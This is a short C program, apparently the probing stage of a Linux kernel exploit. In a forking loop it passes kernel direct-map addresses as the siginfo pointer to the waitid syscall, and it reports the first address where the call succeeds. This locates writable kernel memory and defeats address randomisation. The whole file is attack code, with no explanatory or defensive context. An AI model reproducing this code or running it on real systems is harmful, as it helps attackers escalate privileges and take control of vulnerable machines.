#define _GNU_SOURCE
#include <stdio.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <errno.h>
#include <asm/unistd_64.h>
#define STACK_SIZE 8192

int main(){
    long long int i = 0;
    int pid = 0;
    for(i = (char *)0xffff880000000000; ; i+=0x10000000) {
    pid = fork();
    if (pid > 0) 
    {
        printf("[+] Trying %p\n", i);
        if(syscall(__NR_waitid, P_PID, pid, (siginfo_t *)i, WEXITED, NULL) >= 0) 
        {
            printf("[+] Found %p\n", i);
            break;
        }
    }
    else if (pid == 0)
        exit(0);
    }
}